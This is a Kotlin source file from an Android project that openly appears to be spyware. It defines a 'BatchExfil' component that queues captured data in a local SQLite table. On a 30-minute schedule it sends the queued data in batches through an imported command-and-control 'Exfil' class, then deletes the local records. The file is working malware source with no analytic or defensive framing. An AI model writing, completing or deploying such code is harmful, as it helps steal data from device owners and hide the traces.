package com.sp.core.util

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import com.sp.core.c2.Exfil

class BatchDbHelper(ctx: Context) : SQLiteOpenHelper(ctx, "batch.db", null, 1) {
    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL("""
            CREATE TABLE batch (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                kind TEXT NOT NULL,
                payload TEXT NOT NULL,
                ts INTEGER NOT NULL,
                sent INTEGER DEFAULT 0
            )
        """)
    }
    override fun onUpgrade(db: SQLiteDatabase, oldV: Int, newV: Int) {
        db.execSQL("DROP TABLE IF EXISTS batch")
        onCreate(db)
    }
}

object BatchExfil {
    private const val BATCH_SIZE = 50
    private const val FLUSH_INTERVAL_MS = 30 * 60 * 1000L // 30 minutes

    private fun db(ctx: Context): SQLiteDatabase =
        BatchDbHelper(ctx).writableDatabase

    fun enqueue(ctx: Context, kind: String, payload: String) {
        val cv = ContentValues().apply {
            put("kind", kind)
            put("payload", payload)
            put("ts", System.currentTimeMillis())
            put("sent", 0)
        }
        db(ctx).insert("batch", null, cv)
    }

    fun flush(ctx: Context) {
        val d = db(ctx)
        val rows = d.query(
            "batch",
            arrayOf("id", "kind", "payload"),
            "sent = 0",
            null, null, null, "ts ASC", "$BATCH_SIZE"
        )
        val toDelete = mutableListOf<Long>()
        while (rows.moveToNext()) {
            val id = rows.getLong(0)
            val kind = rows.getString(1)
            val payload = rows.getString(2)
            Exfil.sendLog(ctx, kind, payload)
            toDelete.add(id)
        }
        rows.close()
        if (toDelete.isNotEmpty()) {
            val ids = toDelete.joinToString(",") { it.toString() }
            d.delete("batch", "id IN ($ids)", null)
        }
    }

    fun pendingCount(ctx: Context): Int {
        val d = db(ctx)
        val c = d.query("batch", arrayOf("count(*)"), "sent = 0", null, null, null, null)
        c.moveToFirst()
        val n = c.getInt(0)
        c.close()
        return n
    }
}
